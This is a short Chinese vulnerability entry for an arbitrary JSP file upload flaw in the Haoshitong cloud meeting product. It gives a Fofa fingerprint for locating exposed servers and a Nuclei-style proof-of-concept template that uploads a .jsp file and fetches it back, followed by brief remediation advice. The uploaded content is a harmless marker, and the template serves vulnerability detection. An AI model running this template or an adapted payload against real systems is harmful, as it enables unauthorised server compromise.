# 好视通云会议upLoad2.jsp文件任意文件上传漏洞

- **系统**：好视通云会议upLoad2.jsp文件　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="images/common/logina_1.gif"`
- **请求**：`POST /fm/systemConfig/upLoad2.jsp HTTP/1.1`

**请求体 / payload**
```
1. Fofa
body="images/common/logina_1.gif"
2、隐患url,复现如下
id: haoshitong-fm-upload
info:
name: haoshitong-fm-upload
author: m0be1
severity: critical
variables:
filename: "{{to_lower(rand_base(5))}}"
http:
- raw:
-
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=1515df1sdfdsfddfs
--1515df1sdfdsfddfs
Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
Content-Type: application/octet-stream
112
--1515df1sdfdsfddfs--
-
GET /fm/upload/{{filename}}.jsp HTTP/1.1
Host: {{Hostname}}
matchers:
- type: dsl
dsl:
- 'status_code==200 && contains_all(body_2,"112")'
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。